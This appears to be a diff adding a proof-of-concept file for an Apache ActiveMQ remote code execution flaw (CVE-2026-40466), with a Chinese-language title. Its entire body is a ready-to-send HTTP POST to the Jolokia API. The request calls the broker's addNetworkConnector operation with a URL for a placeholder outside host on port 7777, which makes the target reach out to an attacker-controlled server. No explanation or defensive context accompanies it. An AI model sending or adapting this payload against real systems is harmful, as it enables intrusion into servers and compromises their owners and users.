@@ -1,0 +1,13 @@
+# Apache ActiveMQ 远程代码执行漏洞(CVE-2026-40466)
+POST /api/jolokia/ HTTP/1.1
+accept: */*
+accept-encoding: gzip, deflate, br
+host: www.xwd_test.com
+Content-Type: application/json
+Content-Length: 183
+connection: close
+user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/ 537.36 (KHTML, like Gecko) Chrome / 98.0.4758.102 Safari / 537.36
+
+{"type":"exec","mbean":"org.apache.activemq:type=Broker,brokerName=localhost",
+   "operation":"addNetworkConnector(java.lang.String)",
+   "arguments":["http://EXTERNAL_HOST:7777/"]}
